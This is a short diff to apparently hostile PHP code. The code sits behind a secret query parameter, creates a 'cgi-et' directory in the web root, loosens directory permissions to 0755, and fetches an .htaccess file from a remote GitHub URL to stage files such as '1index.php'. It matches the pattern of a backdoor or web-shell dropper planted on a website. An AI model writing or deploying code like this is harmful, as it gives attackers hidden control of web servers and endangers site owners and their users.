@@ -3,8 +3,8 @@ if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){
 mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
 echo('Eec secra');   
 
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et", 0644);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et", 0755);
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et/.htaccess", 0644);
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et/1index.php", 0644);
 $filee = sexx('https://raw.githubusercontent.com/HecSec/New/main/.htaccess');
